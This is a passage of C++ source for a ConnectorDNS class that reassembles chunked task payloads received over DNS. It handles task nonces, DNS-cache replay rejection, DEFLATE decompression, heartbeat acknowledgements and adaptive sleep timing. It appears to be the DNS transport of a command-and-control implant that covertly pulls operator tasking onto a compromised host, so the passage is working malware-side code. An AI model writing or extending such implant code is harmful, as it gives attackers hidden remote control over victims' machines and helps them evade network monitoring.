            ULONG total = 0;
            ULONG offset = 0;
            total |= ((ULONG)binBuf[0] << 24);
            total |= ((ULONG)binBuf[1] << 16);
            total |= ((ULONG)binBuf[2] << 8);
            total |= ((ULONG)binBuf[3] << 0);
            offset |= ((ULONG)binBuf[4] << 24);
            offset |= ((ULONG)binBuf[5] << 16);
            offset |= ((ULONG)binBuf[6] << 8);
            offset |= ((ULONG)binBuf[7] << 0);
            ULONG chunkLen = binLen - headerSize;
            const ULONG maxDownloadSize = 4 << 20; // 4MB
            if (total > 0 && total <= maxDownloadSize && offset < total) {
                // NEW DESIGN: Verify received offset matches what we requested.
                // Special case: if we requested offset>0 but got offset=0, this might be
                // a new task from server restart. Check taskNonce to decide.
                if (offset != reqOffset) {
                    // If server returns offset=0 but we wanted offset>0, check if it's a new task
                    if (offset == 0 && reqOffset > 0 && chunkLen >= 9) {
                        ULONG newTaskNonce = 0;
                        newTaskNonce |= (ULONG)binBuf[headerSize + 1];
                        newTaskNonce |= ((ULONG)binBuf[headerSize + 2] << 8);
                        newTaskNonce |= ((ULONG)binBuf[headerSize + 3] << 16);
                        newTaskNonce |= ((ULONG)binBuf[headerSize + 4] << 24);
                        
                        if (newTaskNonce != 0 && newTaskNonce != this->downTaskNonce) {
                            // Different taskNonce: Server restarted with new task, reset our state
                            if (this->downBuf) {
                                MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
                            }
                            this->downBuf = NULL;
                            this->downTotal = 0;
                            this->downFilled = 0;
                            this->downAckOffset = 0;
                            this->downTaskNonce = 0;
                            // Don't return - let it fall through to process this as new task
                        } else {
                            // Same taskNonce or unknown: probably cached old response, discard
                            return;
                        }
                    } else {
                        return; // Discard, will retry with same reqOffset next time
                    }
                }
                
                // Check taskNonce from first chunk (offset=0) to detect new task
                // Frame format: [flags:1][taskNonce:4][origLen:4][payload]
                ULONG chunkTaskNonce = 0;
                if (offset == 0 && chunkLen >= 9) {
                    // Parse taskNonce from chunk (little-endian, bytes 1-4)
                    chunkTaskNonce |= (ULONG)binBuf[headerSize + 1];
                    chunkTaskNonce |= ((ULONG)binBuf[headerSize + 2] << 8);
                    chunkTaskNonce |= ((ULONG)binBuf[headerSize + 3] << 16);
                    chunkTaskNonce |= ((ULONG)binBuf[headerSize + 4] << 24);
                }
                
                // Initialize buffer if needed (starting a NEW task)
                BOOL isNewTask = (!this->downBuf || this->downTotal != total);
                // Also check taskNonce: if nonce differs, it's a new task even if total is same
                if (!isNewTask && offset == 0 && chunkTaskNonce != 0 && chunkTaskNonce != this->downTaskNonce) {
                    isNewTask = TRUE;
                }
                
                // CRITICAL: Reject cached replay of just-completed task
                // If downAckOffset > 0 (just completed a task) and taskNonce matches the old one,
                // this is likely a DNS cache replaying the old task response. Ignore it.
                if (isNewTask && offset == 0 && chunkTaskNonce != 0 && 
                    chunkTaskNonce == this->downTaskNonce && this->downAckOffset > 0) {
                    return; // Ignore this cached response
                }
                
                if (isNewTask) {
                    // CRITICAL: If total or taskNonce changed, this is a NEW task
                    // We must discard current chunk and restart from offset=0
                    if (this->downBuf && this->downTotal) {
                        MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
                    }
                    this->downBuf = (BYTE*)MemAllocLocal(total);
                    if (!this->downBuf) {
                        this->downTotal  = 0;
                        this->downFilled = 0;
                        return;
                    }
                    this->downTotal  = total;
                    this->downFilled = 0;
                    this->downAckOffset = 0; // Reset ACK offset for NEW task
                    this->downTaskNonce = chunkTaskNonce; // Record new task nonce
                    
                    // If current chunk offset != 0, discard it and request from 0 next time
                    if (offset != 0) {
                        return; // Next SendData() will request offset=0
                    }
                }

                // Copy chunk at the correct offset
                ULONG end = offset + chunkLen;
                if (end > total)
                    end = total;
                ULONG n = end - offset;
                memcpy(this->downBuf + offset, binBuf + headerSize, n);
                
                // Update progress: since we request sequentially, downFilled = offset + n
                this->downFilled = offset + n;
                this->downAckOffset = this->downFilled;
                if (this->downFilled >= this->downTotal) {
                    // 解析会话头：[flags:1][taskNonce:4][origLen:4]，然后将原始 payload 交给上层。
                    // 帧头大小 = 1 + 4 + 4 = 9 字节
                    const ULONG frameHeaderSize = 9;
                    BYTE* finalBuf   = this->downBuf;
                    ULONG finalSize  = this->downTotal;
                    if (this->downTotal > frameHeaderSize) {
                        BYTE  flags = this->downBuf[0];
                        // taskNonce at bytes 1-4 (already parsed earlier, skip here)
                        // origLen at bytes 5-8 (little-endian)
                        ULONG orig  = 0;
                        orig |= (ULONG)this->downBuf[5];
                        orig |= ((ULONG)this->downBuf[6] << 8);
                        orig |= ((ULONG)this->downBuf[7] << 16);
                        orig |= ((ULONG)this->downBuf[8] << 24);

                        if ((flags & 0x1) && orig > 0 && orig <= (4u << 20)) {
                            // 压缩路径：使用 DEFLATE 解压下行 payload。
                            BYTE* outBuf = NULL;
                            if (DeflateDecompress(this->downBuf + frameHeaderSize, this->downTotal - frameHeaderSize, &outBuf, orig) && outBuf) {
                                finalBuf  = outBuf;
                                finalSize = orig;
                                MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
                                this->downBuf = NULL;
                            }
                        } else if (flags == 0 && orig > 0 && orig <= this->downTotal - frameHeaderSize) {
                            // 无压缩：直接跳过 9 字节头部，仅将原始任务 payload 交给上层。
                            BYTE* outBuf = (BYTE*)MemAllocLocal(orig);
                            if (outBuf) {
                                memcpy(outBuf, this->downBuf + frameHeaderSize, orig);
                                finalBuf  = outBuf;
                                finalSize = orig;
                                MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
                                this->downBuf = NULL;
                            }
                        }
                    }

                    this->recvData = finalBuf;
                    this->recvSize = (int)finalSize;
                    // 记录本次下行总量，供自适应 sleep 使用
                    this->lastDownTotal = finalSize;
                    // Keep downAckOffset = downTotal so next heartbeat ACKs completion to server!
                    // Don't reset to 0 here - server needs to see ackOffset >= total.
                    // downAckOffset will be reset when a NEW task starts (new downBuf allocation).
                    this->downAckOffset = this->downTotal; // Ensure it signals completion
                    this->downBuf    = NULL;
                    this->downTotal  = 0;
                    this->downFilled = 0;
                    this->hasPendingTasks = FALSE;
                }
                return;
            }
        }
        // 兼容旧协议：无头部时视为完整单包，直接交给上层。
        this->recvData = (BYTE*)MemAllocLocal(binLen);
        if (!this->recvData)
            return;
        memcpy(this->recvData, binBuf, binLen);
        this->recvSize = (int)binLen;
    }
}

BYTE* ConnectorDNS::RecvData()
{
    return this->recvData;
}

int ConnectorDNS::RecvSize()
{
    return this->recvSize;
}

void ConnectorDNS::RecvClear()
{
    this->recvData = NULL;
    this->recvSize = 0;
}

BOOL ConnectorDNS::IsBusy() const
{
    return (this->downBuf != NULL) || this->hasPendingTasks;
}
